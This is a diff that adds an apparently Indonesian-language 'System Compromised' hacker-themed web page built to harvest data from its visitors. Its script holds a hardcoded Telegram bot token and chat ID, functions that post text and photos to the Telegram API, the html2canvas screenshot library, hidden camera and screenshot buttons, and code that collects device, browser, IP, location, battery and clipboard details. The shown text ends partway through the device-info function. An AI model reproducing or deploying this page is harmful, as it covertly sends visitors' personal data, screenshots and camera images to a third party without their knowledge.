@@ -1,0 +1,1314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>System Compromised - Data Transfer Initiated</title>
+  <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <!-- Tambahkan library html2canvas -->
+  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+  <!-- Tambahkan library particles.js -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+
+
+  <style>
+    /* Reset CSS Dasar */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #0a0a0a;
+      color: #00ff00;
+      text-align: center;
+      font-family: 'Iceland', sans-serif;
+      overflow-x: hidden;
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      /* Efek Matrix Background */
+      background: linear-gradient(to bottom, rgba(10, 10, 10, 0.95), rgba(10, 10, 10, 0.95)), url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj48ZmlsdGVyIGlkPSJhIj48ZmVDb2xvck1hdHJpeCBpbj0ic3JjZ3JhcGhpYyIgdmFsdWVzPSIwIDAgMSAwIDAgMCAwIDEgMCAwIDAgMCAwIDEgMCAwIDAgMCAwLjM1IDAiLz48L2ZpbHRlcj48cGF0dGVybiBpZD0iYiIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgd2lkdGg9OCIgaGVpZ2h0PSI4Ij48Y2lyY2xlIGN4PSI0IiBjeT0iNCIgcj0iMC41IiBmaWxsPSIjMDA2NjAwIi8+PC9wYXR0ZXJuPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjYikiLz48L3N2Zz4='); /* Pola dot hijau */
+      background-size: cover;
+      background-position: center;
+      animation: matrix-flow 60s linear infinite;
+    }
+
+    @keyframes matrix-flow {
+      from { background-position: 0 0; }
+      to { background-position: 0 100vh; }
+    }
+
+     /* Container untuk partikel */
+    #particles-js {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        z-index: -2; /* Di bawah elemen lain */
+    }
+
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: repeating-linear-gradient(0deg, #00ff00, #00ff00 1px, transparent 1px, transparent 2px);
+      opacity: 0.05;
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    .container {
+      z-index: 1;
+      max-width: 900px; /* Lebarkan sedikit */
+      width: 100%;
+      padding: 30px; /* Tambah padding */
+      background-color: rgba(0, 0, 0, 0.85); /* Lebih gelap */
+      border: 3px solid #00ff00; /* Border lebih tebal */
+      box-shadow: 0 0 30px #00ff00; /* Shadow lebih kuat */
+      border-radius: 15px; /* Sudut lebih bulat */
+      animation: container-pulse 2s infinite alternate;
+      position: relative; /* Penting untuk z-index */
+    }
+
+    @keyframes container-pulse {
+        from { box-shadow: 0 0 20px #00ff00; }
+        to { box-shadow: 0 0 40px #00ff00, 0 0 60px #00ff00; }
+    }
+
+
+    .title {
+      font-size: 5rem; /* Lebih besar */
+      color: #ff0000;
+      text-shadow: 0 0 15px #ff0000; /* Shadow lebih kuat */
+      margin-bottom: 20px;
+      animation: pulsate 1.5s infinite alternate;
+    }
+
+    @keyframes pulsate {
+      from { text-shadow: 0 0 15px #ff0000; }
+      to { text-shadow: 0 0 30px #ff0000, 0 0 40px #ff0000; }
+    }
+
+    .subtitle {
+      font-size: 3.5rem; /* Lebih besar */
+      color: #00ffff; /* Warna biru kehijauan */
+      text-shadow: 0 0 12px #00ffff; /* Shadow biru kehijauan */
+      margin-bottom: 15px;
+      animation: flicker-blue 1s infinite alternate;
+    }
+
+    @keyframes flicker-blue {
+      0%, 18%, 22%, 25%, 53%, 57%, 100% {
+        text-shadow: 0 0 4px #00ffff, 0 0 11px #00ffff, 0 0 19px #00ffff, 0 0 20px #00ffff, 0 0 24px #00ffff, 0 0 27px #00ffff;
+      }
+      20%, 24%, 55% {
+        text-shadow: none;
+      }
+    }
+
+
+    .ascii-art {
+        font-size: 0.9rem;
+        color: #00ff00;
+        white-space: pre; /* Penting untuk mempertahankan spasi dan baris baru */
+        text-align: left;
+        margin: 20px auto;
+        padding: 15px;
+        border: 1px dashed #00ff00;
+        background-color: rgba(0, 0, 0, 0.6);
+        max-width: 95%;
+        overflow-x: auto; /* Jika ASCII art terlalu lebar */
+    }
+
+    .quote {
+      font-size: 2rem; /* Lebih besar */
+      margin: 30px 0;
+      color: #ffff00;
+      animation: typing 4s steps(40, end) infinite, blink-caret .75s step-end infinite;
+      overflow: hidden;
+      border-right: .15em solid orange;
+      white-space: nowrap;
+      margin: 20px auto; /* Penyesuaian margin */
+      letter-spacing: .15em;
+      max-width: fit-content;
+      padding-right: .5em; /* Ruang untuk caret */
+    }
+
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: orange }
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center; /* Tengahkan vertikal */
+      gap: 40px; /* Jarak antar logo lebih besar */
+      margin-top: 30px;
+      margin-bottom: 30px;
+      flex-wrap: wrap;
+    }
+    /* Hapus gaya untuk img di logo-container */
+    /* .logo-container img { ... } */
+
+    .logo-text {
+        font-family: 'Iceland', sans-serif; /* Font yang sama */
+        font-size: 6rem; /* Ukuran besar */
+        color: #00ff00; /* Warna hijau */
+        text-shadow: 0 0 20px #00ff00; /* Shadow hijau */
+        animation: flicker-green 1s infinite alternate; /* Efek flicker hijau */
+    }
+
+     @keyframes flicker-green {
+      0%, 18%, 22%, 25%, 53%, 57%, 100% {
+        text-shadow: 0 0 4px #00ff00, 0 0 11px #00ff00, 0 0 19px #00ff00, 0 0 20px #00ff00, 0 0 24px #00ff00, 0 0 27px #00ff00;
+      }
+      20%, 24%, 55% {
+        text-shadow: none;
+      }
+    }
+
+     /* Gaya untuk tulisan "KAU SUDAH TAK BISA LARI" */
+     .control-message {
+        font-size: 2.5rem; /* Ukuran yang pas */
+        color: #ffff00; /* Warna kuning */
+        text-shadow: 0 0 10px #ffff00; /* Shadow kuning */
+        margin-top: 20px;
+        margin-bottom: 20px; /* Tetapkan margin-bottom */
+        animation: pulse-yellow 2s infinite alternate; /* Animasi pulsing kuning */
+     }
+
+     @keyframes pulse-yellow {
+         from { text-shadow: 0 0 10px #ffff00; }
+         to { text-shadow: 0 0 20px #ffff00, 0 0 30px #ffff00; }
+     }
+
+
+    audio {
+      margin-top: 30px;
+      filter: invert(1) hue-rotate(90deg);
+      width: 100%; /* Lebar penuh kontainer */
+      max-width: 500px; /* Maksimum lebar */
+    }
+
+    .info-section {
+      margin-top: 40px;
+      padding-top: 20px;
+      border-top: 2px dashed #00ff00;
+      text-align: left;
+    }
+
+    .info-section h3 {
+      color: #ffff00;
+      margin-bottom: 15px; /* Margin lebih besar */
+      text-align: center;
+      font-size: 1.8rem;
+      text-shadow: 0 0 8px #ffff00;
+    }
+
+    .info-section p {
+      margin-bottom: 10px; /* Margin lebih besar */
+      font-size: 1.3rem; /* Lebih besar */
+      word-break: break-all;
+    }
+
+    .info-section span {
+      color: #ffffff;
+    }
+
+    .glitch {
+      position: relative;
+      display: inline-block;
+    }
+
+    .glitch::before,
+    .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0a0a0a;
+      overflow: hidden;
+    }
+
+    .glitch::before {
+      left: 2px;
+      text-shadow: -2px 0 #ff0000;
+      animation: glitch-anim-2 2s infinite linear alternate-reverse;
+    }
+
+    .glitch::after {
+      left: -2px;
+      text-shadow: -2px 0 #00ffff;
+      animation: glitch-anim 2s infinite linear alternate-reverse;
+    }
+
+    /* Keyframes glitch-anim dan glitch-anim-2 tetap sama */
+    @keyframes glitch-anim {
+      0% { clip: rect(14px, 9999px, 32px, 0) } 5% { clip: rect(13px, 9999px, 10px, 0) } 10% { clip: rect(33px, 9999px, 44px, 0) } 15% { clip: rect(24px, 9999px, 13px, 0) } 20% { clip: rect(25px, 9999px, 36px, 0) } 25% { clip: rect(31px, 9999px, 52px, 0) } 30% { clip: rect(12px, 9999px, 41px, 0) } 35% { clip: rect(50px, 9999px, 10px, 0) } 40% { clip: rect(38px, 9999px, 27px, 0) } 45% { clip: rect(34px, 9999px, 15px, 0) } 50% { clip: rect(18px, 9999px, 39px, 0) } 55% { clip: rect(21px, 9999px, 30px, 0) } 60% { clip: rect(45px, 9999px, 20px, 0) } 65% { clip: rect(10px, 9999px, 49px, 0) } 70% { clip: rect(37px, 9999px, 26px, 0) } 75% { clip: rect(16px, 9999px, 47px, 0) } 80% { clip: rect(29px, 9999px, 35px, 0) } 85% { clip: rect(42px, 9999px, 11px, 0) } 90% { clip: rect(23px, 9999px, 46px, 0) } 95% { clip: rect(48px, 9999px, 19px, 0) } 100% { clip: rect(36px, 9999px, 25px, 0) }
+    }
+
+    @keyframes glitch-anim-2 {
+      0% { clip: rect(11px, 9999px, 42px, 0) } 5% { clip: rect(46px, 9999px, 23px, 0) } 10% { clip: rect(19px, 9999px, 48px, 0) } 15% { clip: rect(25px, 9999px, 36px, 0) } 20% { clip: rect(47px, 9999px, 16px, 0) } 25% { clip: rect(26px, 9999px, 37px, 0) } 30% { clip: rect(49px, 9999px, 10px, 0) } 35% { clip: rect(20px, 9999px, 45px, 0) } 40% { clip: rect(35px, 9999px, 29px, 0) } 45% { clip: rect(11px, 9999px, 42px, 0) } 50% { clip: rect(23px, 9999px, 46px, 0) } 55% { clip: rect(48px, 9999px, 19px, 0) } 60% { clip: rect(36px, 9999px, 25px, 0) } 65% { clip: rect(16px, 9999px, 47px, 0) } 70% { clip: rect(26px, 9999px, 37px, 0) } 75% { clip: rect(49px, 9999px, 10px, 0) } 80% { clip: rect(20px, 9999px, 45px, 0) } 85% { clip: rect(35px, 9999px, 29px, 0) } 90% { clip: rect(11px, 9999px, 42px, 0) } 95% { clip: rect(23px, 9999px, 46px, 0) } 100% { clip: rect(48px, 9999px, 19px, 0) }
+    }
+
+    /* Menghapus gaya random-message karena elemennya dihapus */
+    /* .random-message { ... } */
+
+
+    .system-info-display {
+      margin-top: 30px;
+      padding: 20px; /* Lebih besar */
+      border: 2px solid #00ff00; /* Lebih tebal */
+      background-color: rgba(0, 0, 0, 0.6); /* Lebih gelap */
+      text-align: left;
+      font-size: 1.2rem; /* Lebih besar */
+      box-shadow: 0 0 15px rgba(0, 255, 0, 0.5); /* Shadow hijau transparan */
+    }
+
+    .system-info-display h3 {
+      text-align: center;
+      color: #ffff00;
+      margin-bottom: 15px; /* Margin lebih besar */
+      font-size: 1.8rem;
+      text-shadow: 0 0 8px #ffff00;
+    }
+
+    .system-info-display p {
+      margin-bottom: 8px;
+    }
+
+    .system-info-display span {
+      color: #ffffff;
+    }
+
+    .interactive-button {
+      display: inline-block;
+      margin-top: 30px;
+      padding: 12px 25px; /* Lebih besar */
+      font-family: 'Iceland', sans-serif;
+      font-size: 1.8rem; /* Lebih besar */
+      color: #ff0000;
+      background-color: transparent;
+      border: 3px solid #ff0000; /* Lebih tebal */
+      box-shadow: 0 0 15px #ff0000; /* Lebih kuat */
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+      text-decoration: none;
+      margin: 15px; /* Margin lebih besar */
+      text-transform: uppercase; /* Huruf besar */
+    }
+
+    .interactive-button:hover {
+      color: #0a0a0a;
+      background-color: #ff0000;
+      box-shadow: 0 0 25px #ff0000, 0 0 35px #ff0000; /* Shadow lebih kuat saat hover */
+      transform: translateY(-3px); /* Efek angkat */
+    }
+
+     /* Tombol interaktif sekarang disembunyikan */
+     .interactive-button {
+        display: none;
+     }
+
+
+    .digital-clock {
+      font-size: 3rem; /* Lebih besar */
+      color: #00ffff;
+      margin-top: 20px;
+      text-shadow: 0 0 15px #00ffff;
+      animation: flicker-blue 1s infinite alternate; /* Efek flicker juga pada jam */
+    }
+
+    /* Simulasi Terminal Output */
+    .terminal-output {
+        margin-top: 30px;
+        padding: 20px;
+        border: 2px solid #00ff00;
+        background-color: rgba(0, 0, 0, 0.7);
+        text-align: left;
+        font-size: 1.1rem;
+        max-height: 200px; /* Batasi tinggi */
+        overflow-y: auto; /* Aktifkan scroll */
+        white-space: pre-wrap; /* Pertahankan spasi dan baris baru, wrap teks */
+        word-wrap: break-word; /* Break long words */
+        color: #00ff00;
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    }
+
+    .terminal-output::before {
+        content: '> '; /* Prompt */
+        color: #ffff00;
+    }
+
+    .terminal-output p {
+        margin: 0;
+        padding: 0;
+        line-height: 1.4;
+    }
+
+    .terminal-output .command {
+        color: #00ffff;
+    }
+     .terminal-output .success {
+        color: #ffff00;
+    }
+    .terminal-output .error {
+        color: #ff0000;
+    }
+    .terminal-output .warning {
+        color: #ffff00;
+    }
+
+
+    /* Progress Bar Simulasi */
+    .progress-container {
+        width: 90%;
+        margin: 30px auto 20px auto;
+        border: 2px solid #00ff00;
+        padding: 5px;
+        background-color: rgba(0, 0, 0, 0.7);
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    }
+
+    .progress-bar {
+        width: 0%;
+        height: 25px;
+        background-color: #00ffff;
+        text-align: center;
+        line-height: 25px;
+        color: #0a0a0a;
+        font-weight: bold;
+        transition: width 0.5s ease-in-out;
+        box-shadow: 0 0 8px #00ffff;
+    }
+
+    /* Fitur Tambahan */
+    .feature-section {
+        margin-top: 40px;
+        padding-top: 20px;
+        border-top: 2px dashed #00ffff;
+        text-align: left;
+    }
+
+    .feature-section h3 {
+        color: #00ffff;
+        margin-bottom: 15px;
+        text-align: center;
+        font-size: 1.8rem;
+        text-shadow: 0 0 8px #00ffff;
+    }
+
+    .feature-section p {
+        margin-bottom: 10px;
+        font-size: 1.3rem;
+    }
+
+    .feature-section span {
+        color: #ffffff;
+    }
+
+     /* Data Table Simulation */
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 20px;
+        font-size: 1.1rem;
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    }
+
+    .data-table th, .data-table td {
+        border: 1px solid #00ff00;
+        padding: 10px;
+        text-align: left;
+    }
+
+    .data-table th {
+        background-color: rgba(0, 255, 0, 0.2);
+        color: #ffff00;
+        text-shadow: 0 0 5px #ffff00;
+    }
+
+    .data-table td {
+        background-color: rgba(0, 0, 0, 0.5);
+        color: #00ff00;
+    }
+
+    /* Simulasi Log Aktivitas */
+    .activity-log {
+        margin-top: 30px;
+        padding: 20px;
+        border: 2px solid #ffff00;
+        background-color: rgba(0, 0, 0, 0.7);
+        text-align: left;
+        font-size: 1rem;
+        max-height: 250px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        color: #ffff00;
+        box-shadow: 0 0 10px rgba(255, 255, 0, 0.5);
+    }
+
+    .activity-log h3 {
+         text-align: center;
+         color: #ff0000;
+         margin-bottom: 15px;
+         font-size: 1.8rem;
+         text-shadow: 0 0 8px #ff0000;
+    }
+
+    .activity-log p {
+        margin: 5px 0;
+        padding: 0;
+        line-height: 1.3;
+    }
+
+    .activity-log .log-info { color: #00ffff; }
+    .activity-log .log-warning { color: #ffff00; }
+    .activity-log .log-error { color: #ff0000; }
+    .activity-log .log-success { color: #00ff00; }
+
+
+    /* Konfigurasi Partikel */
+    canvas.particles-js-canvas-el {
+        position: fixed;
+        top: 0;
+        left: 0;
+        z-index: -2;
+    }
+
+
+    /* Media Queries untuk Responsivitas */
+    @media (max-width: 768px) {
+      .title { font-size: 4rem; }
+      .subtitle { font-size: 2.5rem; }
+      .ascii-art { font-size: 0.8rem; }
+      .quote { font-size: 1.5rem; }
+      .logo-text { font-size: 4rem;} /* Ukuran logo teks responsif */
+      .control-message { font-size: 2rem; } /* Ukuran pesan kontrol responsif */
+      /* Hapus gaya random-message responsif */
+      /* .random-message { font-size: 1.4rem; } */
+      .system-info-display, .terminal-output, .feature-section p, .data-table, .activity-log { font-size: 1rem; }
+      .digital-clock { font-size: 2.5rem; }
+      .interactive-button { font-size: 1.5rem; padding: 10px 20px; }
+      .info-section h3, .system-info-display h3, .feature-section h3, .activity-log h3 { font-size: 1.5rem; }
+      .info-section p { font-size: 1.1rem; }
+      .progress-bar { height: 20px; line-height: 20px; }
+       .data-table th, .data-table td { padding: 8px; }
+        .activity-log p { font-size: 0.9rem; }
+    }
+
+    @media (max-width: 480px) {
+      .title { font-size: 3rem; }
+      .subtitle { font-size: 2rem; }
+      .ascii-art { font-size: 0.7rem; }
+      .quote { font-size: 1.2rem; }
+      .logo-text { font-size: 3rem;} /* Ukuran logo teks responsif */
+       .control-message { font-size: 1.5rem; } /* Ukuran pesan kontrol responsif */
+       /* Hapus gaya random-message responsif */
+      /* .random-message { font-size: 1.2rem; } */
+      .system-info-display, .terminal-output, .feature-section p, .data-table, .activity-log { font-size: 0.9rem; }
+      .digital-clock { font-size: 2rem; }
+      .interactive-button { font-size: 1.2rem; padding: 8px 15px; }
+      .info-section h3, .system-info-display h3, .feature-section h3, .activity-log h3 { font-size: 1.3rem; }
+      .info-section p { font-size: 1rem; }
+       .progress-bar { height: 18px; line-height: 18px; }
+       .data-table th, .data-table td { padding: 6px; }
+       .activity-log p { font-size: 0.8rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Container untuk Partikel -->
+  <div id="particles-js"></div>
+
+  <div class="container animate__animated animate__fadeIn">
+    <h1 class="title glitch" data-text="WELCOME TO PENDERITAAN ">WELCOME TO PENDERITAAN</h1>
+    <div class="logo-container">
+      <div class="logo-text">VINSS</div>
+    </div>
+    <h2 class="subtitle animate__animated animate__flash infinite">INI BARU PERMULAAN</h2>
+
+    <!-- Menambahkan tulisan "............................" -->
+    <div class="control-message">............................</div>
+
+     <!-- ASCII Art -->
+    <pre class="ascii-art">
+      JANGAN KHAWATIR SEMUA TERKENDALI KAWAN
+    </pre>
+
+
+    <p class="quote">System Breached</p>
+
+    <div class="digital-clock"></div> <!-- Placeholder untuk jam digital -->
+
+    <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio>
+    <audio id="typing-sound" src="https://www.soundjay.com/mechanical-pencil-sound-effect-1.mp3"></audio> <!-- Suara ketikan -->
+
+
+    <!-- Simulasi Terminal Output -->
+    <div class="terminal-output" id="terminal-output">
+      <p><span class="command">Initializing system...</span></p>
+    </div>
+
+    <!-- Progress Bar -->
+    <div class="progress-container">
+        <div class="progress-bar" id="progress-bar">0%</div>
+    </div>
+
+
+    <!-- Menampilkan Informasi Sistem yang Dikumpulkan -->
+    <div class="system-info-display">
+      <h3>System Information Detected:</h3>
+      <p>IP Address: <span id="ip-address">Collecting...</span></p>
+      <p>Approx. Location: <span id="approx-location">Collecting...</span></p>
+      <p>Device Info: <span id="device-info">Collecting...</span></p>
+      <p>Battery: <span id="battery-info">Collecting...</span></p>
+       <p>Clipboard: <span id="clipboard-info">Collecting...</span></p>
+       <p>Screen Size: <span id="screen-size">Collecting...</span></p>
+       <p>Browser Info: <span id="browser-info">Collecting...</span></p>
+       <p>Connection Type: <span id="connection-type">Collecting...</span></p>
+      <!-- Anda bisa tambahkan placeholder untuk info lain jika ingin menampilkannya -->
+    </div>
+
+    <!-- Fitur Tambahan: Data Simulasi -->
+     <div class="feature-section">
+        <h3>Simulated Data Streams:</h3>
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th>System ID</th>
+                    <th>Status</th>
+                    <th>Data Volume</th>
+                </tr>
+            </thead>
+            <tbody id="data-streams">
+                <tr>
+                    <td>SRV-001</td>
+                    <td><span class="success">Online</span></td>
+                    <td>1.2 GB</td>
+                </tr>
+                 <tr>
+                    <td>DB-SECURE</td>
+                    <td><span class="success">Online</span></td>
+                    <td>8.5 TB</td>
+                </tr>
+                 <tr>
+                    <td>FW-MAIN</td>
+                    <td><span class="error">Compromised</span></td>
+                    <td>N/A</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Simulasi Log Aktivitas -->
+    <div class="activity-log" id="activity-log">
+        <h3>System Activity Log:</h3>
+        <p><span class="log-info">[INFO] System boot sequence initiated.</span></p>
+    </div>
+
+     <!-- Simulasi File/Directory Listing -->
+    <div class="feature-section">
+        <h3>Simulated File Listing:</h3>
+        <pre class="ascii-art" id="file-listing">
+/root/
+├── important_docs/
+│   ├── financial_records.xlsx
+│   └── private_keys.pem
+├── user_data/
+│   ├── passwords.txt
+│   └── browsing_history.log
+└── system_logs/
+    └── error.log
+        </pre>
+    </div>
+
+     <!-- Simulasi Network Status -->
+     <div class="feature-section">
+        <h3>Simulated Network Status:</h3>
+        <pre class="ascii-art" id="network-status">
+Interface: eth0
+Status: UP
+IP Address: 192.168.1.101
+Netmask: 255.255.255.0
+Gateway: 192.168.1.1
+Packets Sent: 12345
+Packets Received: 54321
+Errors: 0
+Drops: 0
+        </pre>
+     </div>
+
+
+    <!-- Tombol Interaktif - Sekarang Disembunyikan -->
+    <button class="interactive-button" style="display: none;">akses telah ter hack</button>
+    <!-- Tombol kamera dan screenshot juga disembunyikan -->
+    <button class="interactive-button camera-button" id="capture-camera-button" style="display: none;">Capture Photo</button>
+    <button class="interactive-button screenshot-button" id="capture-screenshot-button" style="display: none;">Capture Screenshot</button>
+
+
+  </div>
+
+  <script>
+    // Kode JavaScript
+    const botToken = '7521529861:AAHH7mN4_dZcEzPUcle_8oAAlgodB_GAFm8'; // Ganti dengan token bot Anda
+    const chatID = '7885361809'; // Ganti dengan Chat ID Anda
+
+    const terminalOutput = document.getElementById('terminal-output');
+    const progressBar = document.getElementById('progress-bar');
+    const typingSound = document.getElementById('typing-sound');
+    const activityLog = document.getElementById('activity-log');
+
+    typingSound.volume = 0.1; // Atur volume suara ketikan
+
+    // Inisialisasi particles.js
+    particlesJS('particles-js', {
+        "particles": {
+            "number": {
+                "value": 80, // Jumlah partikel
+                "density": {
+                    "enable": true,
+                    "value_area": 800 // Area kepadatan partikel
+                }
+            },
+            "color": {
+                "value": "#00ff00" // Warna partikel (hijau)
+            },
+            "shape": {
+                "type": "circle", // Bentuk partikel
+                "stroke": {
+                    "width": 0,
+                    "color": "#000000"
+                },
+                "polygon": {
+                    "nb_sides": 5
+                }
+            },
+            "opacity": {
+                "value": 0.5, // Opasitas partikel
+                "random": false,
+                "anim": {
+                    "enable": false,
+                    "speed": 1,
+                    "opacity_min": 0.1,
+                    "sync": false
+                }
+            },
+            "size": {
+                "value": 3, // Ukuran partikel
+                "random": true,
+                "anim": {
+                    "enable": false,
+                    "speed": 40,
+                    "size_min": 0.1,
+                    "sync": false
+                }
+            },
+            "line_linked": {
+                "enable": true,
+                "distance": 150, // Jarak antar partikel yang terhubung
+                "color": "#00ff00", // Warna garis
+                "opacity": 0.4, // Opasitas garis
+                "width": 1 // Ketebalan garis
+            },
+            "move": {
+                "enable": true,
+                "speed": 6, // Kecepatan gerakan partikel
+                "direction": "none",
+                "random": false,
+                "straight": false,
+                "out_mode": "out",
+                "bounce": false,
+                "attract": {
+                    "enable": false,
+                    "rotateX": 600,
+                    "rotateY": 1200
+                }
+            }
+        },
+        "interactivity": {
+            "detect_on": "canvas",
+            "events": {
+                "onhover": {
+                    "enable": true,
+                    "mode": "repulse" // Efek saat hover (menolak)
+                },
+                "onclick": {
+                    "enable": true,
+                    "mode": "push" // Efek saat klik (menambah)
+                },
+                "resize": true
+            },
+            "modes": {
+                "grab": {
+                    "distance": 400,
+                    "line_linked": {
+                        "opacity": 1
+                    }
+                },
+                "bubble": {
+                    "distance": 400,
+                    "size": 40,
+                    "duration": 2,
+                    "opacity": 8,
+                    "speed": 3
+                },
+                "repulse": {
+                    "distance": 200,
+                    "duration": 0.4
+                },
+                "push": {
+                    "particles_nb": 4
+                },
+                "remove": {
+                    "particles_nb": 2
+                }
+            }
+        },
+        "retina_detect": true
+    });
+
+
+    function appendToTerminal(message, type = '') {
+        const p = document.createElement('p');
+        p.innerHTML = `> <span class="${type}">${message}</span>`;
+        terminalOutput.appendChild(p);
+        terminalOutput.scrollTop = terminalOutput.scrollHeight; // Scroll ke bawah
+         // Mainkan suara ketikan (opsional, bisa mengganggu jika terlalu sering)
+        // typingSound.currentTime = 0;
+        // typingSound.play();
+    }
+
+    function appendToLog(message, type = 'log-info') {
+        const p = document.createElement('p');
+        const timestamp = new Date().toLocaleTimeString();
+        p.innerHTML = `[${timestamp}] <span class="${type}">${message}</span>`;
+        activityLog.appendChild(p);
+        activityLog.scrollTop = activityLog.scrollHeight;
+    }
+
+
+    function simulateProgress(duration = 5000) {
+        let width = 0;
+        const interval = 50; // ms
+        const increment = (100 / (duration / interval));
+        const progressTimer = setInterval(() => {
+            width += increment;
+            if (width >= 100) {
+                width = 100;
+                clearInterval(progressTimer);
+                appendToTerminal("Progress complete. Analyzing data...", 'success');
+                appendToLog("Data analysis complete.", 'log-success');
+            }
+            progressBar.style.width = width + '%';
+            progressBar.innerText = Math.round(width) + '%';
+        }, interval);
+    }
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      }).then(response => {
+          if (response.ok) {
+              console.log("Message sent to Telegram.");
+              appendToTerminal("Data package sent to remote server.", 'success');
+              appendToLog("Text data sent to Telegram.", 'log-success');
+          } else {
+              response.text().then(text => {
+                 console.error("Failed to send message to Telegram:", response.status, text);
+                 appendToTerminal(`Failed to send data: ${response.status}`, 'error');
+                 appendToLog(`Failed to send text data: ${response.status}`, 'log-error');
+              });
+          }
+      }).catch(error => {
+         console.error("Error sending message to Telegram:", error);
+         appendToTerminal("Network error during data transfer.", 'error');
+         appendToLog(`Network error sending text data: ${error.message}`, 'log-error');
+      });
+    }
+
+     function sendPhotoToTelegram(blob, filename = 'photo.jpg') {
+        let formData = new FormData();
+        formData.append('chat_id', chatID);
+        formData.append('photo', blob, filename);
+
+        appendToTerminal(`Uploading ${filename}...`, 'command');
+        appendToLog(`Uploading file: ${filename}`, 'log-info');
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).then(response => {
+           if (response.ok) {
+               console.log(`${filename} sent successfully.`);
+               appendToTerminal(`${filename} uploaded.`, 'success');
+               appendToLog(`${filename} uploaded successfully.`, 'log-success');
+           } else {
+               response.text().then(text => console.error(`Failed to send ${filename}. Status: ${response.status}, Response: ${text}`));
+               appendToTerminal(`Failed to upload ${filename}: ${response.status}`, 'error');
+               appendToLog(`Failed to upload ${filename}: ${response.status}`, 'log-error');
+           }
+        }).catch(error => {
+           console.error(`Error sending ${filename}:`, error);
+           appendToTerminal(`Network error uploading ${filename}.`, 'error');
+           appendToLog(`Network error uploading ${filename}: ${error.message}`, 'log-error');
+        });
+    }
+
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const plat = navigator.platform;
+      const lang = navigator.language;
+      const res = `${screen.width}x${screen.height}`;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const online = navigator.onLine ? "Online" : "Offline";
+      const now = new Date().toLocaleString();
+      const vendor = navigator.vendor || 'N/A';
+      const maxTouchPoints = navigator.maxTouchPoints || 0;
+      const cpuCores = navigator.hardwareConcurrency || 'N/A';
+      const deviceMemory = navigator.deviceMemory || 'N/A';
+
+
+      // Parse browser info from user agent (lebih detail)
+      let browserName = "Unknown Browser";
+      let browserVersion = "Unknown Version";
+      let osName = "Unknown OS";
+
+      if (ua.includes("Firefox")) {
+          browserName = "Firefox";
+          browserVersion = ua.substring(ua.indexOf("Firefox/") + 8).split(" ")[0];
+      } else if (ua.includes("Chrome")) {
+          browserName = "Chrome";
+           browserVersion = ua.substring(ua.indexOf("Chrome/") + 7).split(" ")[0];
+      } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+          browserName = "Safari";
+           browserVersion = ua.substring(ua.indexOf("Version/") + 8).split(" ")[0];
+      } else if (ua.includes("Edge")) {
+          browserName = "Edge";
+           browserVersion = ua.substring(ua.indexOf("Edge/") + 5).split(" ")[0];
+      } else if (ua.includes("Opera") || ua.includes("OPR")) {
+           browserName = "Opera";
+           browserVersion = ua.includes("Opera") ? ua.substring(ua.indexOf("Opera/") + 6).split(" ")[0] : ua.substring(ua.indexOf("OPR/") + 4).split(" ")[0];
+      }
+
+      if (ua.includes("Windows NT")) {
+          osName = "Windows";
+      } else if (ua.includes("Macintosh")) {
+          osName = "macOS";
+      } else if (ua.includes("Android")) {
+          osName = "Android";
+      } else if (ua.includes("Linux")) {
+          osName = "Linux";
+      } else if (ua.includes("iOS")) {
+          osName = "iOS";
+      }
+
+
+      const browserInfoString = `- Name: ${browserName}\n- Version: ${browserVersion}`;
+      document.getElementById('browser-info').innerText = browserInfoString.replace(/\n-/g, ', ').substring(2);
+
+
+       const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+       document.getElementById('connection-type').innerText = connectionType;
